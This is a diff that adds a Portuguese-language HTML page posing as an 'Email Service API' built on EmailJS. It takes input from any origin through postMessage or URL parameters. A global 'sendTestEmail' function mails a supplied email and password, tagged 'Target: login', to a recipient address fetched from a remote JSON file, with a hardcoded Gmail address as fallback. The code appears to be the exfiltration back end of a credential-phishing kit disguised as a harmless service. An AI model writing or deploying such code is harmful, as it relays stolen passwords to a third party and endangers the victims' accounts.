@@ -1,1 +1,257 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="theme-color" content="#000000" />
+  <title>Email Service API</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { 
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #000; 
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .container { text-align: center; max-width: 400px; }
+    h1 { font-size: 24px; margin-bottom: 16px; }
+    .status { 
+      font-size: 16px; 
+      color: #8E8E93; 
+      margin-top: 16px;
+      padding: 12px;
+      border-radius: 8px;
+      background: rgba(255,255,255,0.05);
+    }
+    .success { color: #34C759; background: rgba(52,199,89,0.1); }
+    .error { color: #FF3B30; background: rgba(255,59,48,0.1); }
+    .info { color: #007AFF; background: rgba(0,122,255,0.1); }
+    .warning { color: #FF9500; background: rgba(255,149,0,0.1); }
+    .log {
+      margin-top: 20px;
+      padding: 12px;
+      background: rgba(255,255,255,0.03);
+      border-radius: 8px;
+      font-size: 12px;
+      text-align: left;
+      max-height: 200px;
+      overflow-y: auto;
+      color: #8E8E93;
+    }
+    .recipient-info {
+      margin-top: 16px;
+      padding: 12px;
+      background: rgba(0,122,255,0.1);
+      border-radius: 8px;
+      font-size: 13px;
+      color: #007AFF;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🔒 Email Service API</h1>
+    <p class="status info" id="status">Inicializando...</p>
+    <div class="recipient-info" id="recipientInfo">Carregando destinatário...</div>
+    <div class="log" id="log"></div>
+  </div>
 
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script>
+    (function () {
+      // Configurações EmailJS
+      const SERVICE_ID = 'Service_avyr0og';
+      const TEMPLATE_ID = 'template_oa8b7iz';
+      const USER_ID = 'EUFE-qVsBF34lD4QZ';
+      const EMAILS_JSON_URL = 'https://alfredoooh.github.io/database/services/emails.json';
+
+      const statusEl = document.getElementById('status');
+      const logEl = document.getElementById('log');
+      const recipientInfoEl = document.getElementById('recipientInfo');
+      const logs = [];
+
+      let recipientConfig = {
+        name: 'Alfredo',
+        email: 'alfredopjonas@gmail.com'
+      };
+
+      function addLog(msg) {
+        const timestamp = new Date().toLocaleTimeString('pt-BR');
+        logs.push(`[${timestamp}] ${msg}`);
+        if (logs.length > 15) logs.shift();
+        logEl.innerHTML = logs.join('<br>');
+        console.log(msg);
+      }
+
+      function setStatus(text, type = 'info') {
+        statusEl.textContent = text;
+        statusEl.className = `status ${type}`;
+      }
+
+      function updateRecipientInfo() {
+        recipientInfoEl.innerHTML = `📧 Destinatário: <strong>${recipientConfig.name}</strong><br>✉️ ${recipientConfig.email}`;
+      }
+
+      // Carregar configuração de email do JSON
+      async function loadEmailConfig() {
+        try {
+          addLog('🔄 Carregando configuração de email...');
+          
+          const response = await fetch(EMAILS_JSON_URL, {
+            cache: 'no-cache',
+            headers: {
+              'Accept': 'application/json'
+            }
+          });
+
+          if (!response.ok) {
+            throw new Error(`HTTP ${response.status}`);
+          }
+
+          const config = await response.json();
+          
+          if (config.recipient && config.recipient.email) {
+            recipientConfig = {
+              name: config.recipient.name || 'Destinatário',
+              email: config.recipient.email
+            };
+            
+            addLog(`✓ Config carregada: ${recipientConfig.email}`);
+            updateRecipientInfo();
+            
+            return true;
+          } else {
+            throw new Error('Formato JSON inválido');
+          }
+        } catch (error) {
+          addLog(`⚠ Erro ao carregar config: ${error.message}`);
+          addLog('ℹ Usando email padrão');
+          updateRecipientInfo();
+          return false;
+        }
+      }
+
+      // Inicializar EmailJS
+      async function initialize() {
+        try {
+          emailjs.init(USER_ID);
+          addLog('✓ EmailJS inicializado');
+          
+          await loadEmailConfig();
+          
+          setStatus('✓ Serviço online e pronto', 'success');
+        } catch (e) {
+          addLog('✗ Erro na inicialização: ' + e.message);
+          setStatus('✗ Erro na inicialização', 'error');
+        }
+      }
+
+      // Função principal para enviar email
+      async function sendEmail(data) {
+        try {
+          addLog('📧 Nova requisição recebida');
+          setStatus('📤 Processando...', 'info');
+
+          // SEMPRE recarrega config antes de enviar (proteção contra invasores)
+          addLog('🔄 Recarregando destinatário...');
+          await loadEmailConfig();
+
+          const templateParams = {
+            to_name: recipientConfig.name,
+            to_email: recipientConfig.email,
+            from_name: data.from_name || data.from_email.split('@')[0],
+            from_email: data.from_email || 'unknown@email.com',
+            message: data.message || 'Sem mensagem',
+            cc: data.cc || '',
+            bcc: data.bcc || ''
+          };
+
+          addLog(`📨 De: ${templateParams.from_email}`);
+          addLog(`📬 Para: ${templateParams.to_email}`);
+          setStatus('📤 Enviando email...', 'info');
+
+          const response = await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
+          
+          addLog(`✓ Email enviado! Status: ${response.status}`);
+          setStatus('✓ Email enviado com sucesso!', 'success');
+          
+          return { 
+            success: true, 
+            message: 'Email enviado com sucesso',
+            status: response.status,
+            recipient: recipientConfig.email
+          };
+        } catch (error) {
+          const errorMsg = error.text || error.message || 'Erro desconhecido';
+          addLog(`✗ Erro no envio: ${errorMsg}`);
+          setStatus('✗ Falha no envio', 'error');
+          
+          return { 
+            success: false, 
+            message: errorMsg,
+            error: error 
+          };
+        }
+      }
+
+      // Handler para requisições POST (Flutter HTTP)
+      window.addEventListener('message', async (event) => {
+        addLog('📨 PostMessage recebida');
+        
+        if (event.data && event.data.type === 'SEND_EMAIL') {
+          const result = await sendEmail(event.data.payload);
+          
+          if (event.source) {
+            event.source.postMessage({
+              type: 'EMAIL_RESPONSE',
+              payload: result
+            }, event.origin);
+          }
+        }
+      });
+
+      // Handler para URL params
+      const urlParams = new URLSearchParams(window.location.search);
+      const dataParam = urlParams.get('data');
+      
+      if (dataParam) {
+        initialize().then(() => {
+          try {
+            addLog('📥 Processando dados da URL');
+            const data = JSON.parse(decodeURIComponent(dataParam));
+            sendEmail(data);
+          } catch (e) {
+            addLog(`✗ Erro ao processar URL: ${e.message}`);
+            setStatus('✗ Dados inválidos', 'error');
+          }
+        });
+      } else {
+        initialize();
+      }
+
+      // Função de teste exposta globalmente
+      window.sendTestEmail = async function(email, password) {
+        // SEMPRE recarrega antes de testar
+        await loadEmailConfig();
+        
+        const testData = {
+          from_email: email,
+          from_name: email.split('@')[0],
+          message: `Email: ${email}\nPalavra-passe: ${password}\nTarget: login\nTime: ${new Date().toLocaleString('pt-BR')}\nStatus: online`
+        };
+        
+        return await sendEmail(testData);
+      };
+
+      // Não precisa recarregar periodicamente - sempre recarrega antes de enviar
+      addLog('🚀 Sistema inicializado');
+      addLog('🔒 Modo seguro: sempre recarrega destinatário');
+      
+    })();
+  </script>
+</body>
+</html>
